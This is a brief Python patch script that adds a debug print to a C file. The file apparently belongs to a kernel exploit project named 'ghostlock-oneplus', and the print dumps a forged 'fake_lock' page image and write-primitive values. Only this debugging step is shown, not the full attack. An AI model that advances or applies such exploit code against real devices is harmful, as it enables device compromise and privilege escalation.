import re
U="/root/ghostlock/ghostlock-oneplus/src/core/util.c"
s=open(U).read()
assert "build pg100" not in s
anchor="""  prepare_skb_payload(base, payload_mode);     /* fills skb_buf; fake_lock==base */
  memcpy(perf_page_map, skb_buf + LOCK_OFF, PAGE_SIZE);  /* image at page offset 0 */
"""
add="""  prepare_skb_payload(base, payload_mode);     /* fills skb_buf; fake_lock==base */
  memcpy(perf_page_map, skb_buf + LOCK_OFF, PAGE_SIZE);  /* image at page offset 0 */
  pr_info("build pg100=%016llx pg108=%016llx pg318=%016llx pg320=%016llx pg328=%016llx "
          "(wr=%016llx wp=%016llx)\\n",
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x100),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x108),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x318),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x320),
          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x328),
          (unsigned long long)ssopt_write_right, (unsigned long long)ssopt_write_pc);
  fsync(1);
"""
assert s.count(anchor)==1, s.count(anchor)
s=s.replace(anchor, add, 1)
open(U,"w").write(s)
print("util.c: build pg print added")
